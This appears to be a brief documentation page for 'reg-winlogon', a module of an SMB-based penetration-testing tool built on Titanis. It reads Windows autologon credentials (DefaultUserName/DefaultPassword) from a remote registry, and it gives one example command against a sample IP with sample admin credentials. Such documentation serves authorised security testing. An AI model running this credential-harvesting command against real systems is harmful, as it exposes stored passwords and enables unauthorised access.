# reg-winlogon

Reads Winlogon autologon credentials (DefaultUserName/DefaultPassword)

```bash
atlas smb 192.168.1.5 -u admin -p 'Password1!' -M reg-winlogon
```

Via Titanis (`SmbRegWinlogonModule.cs`).
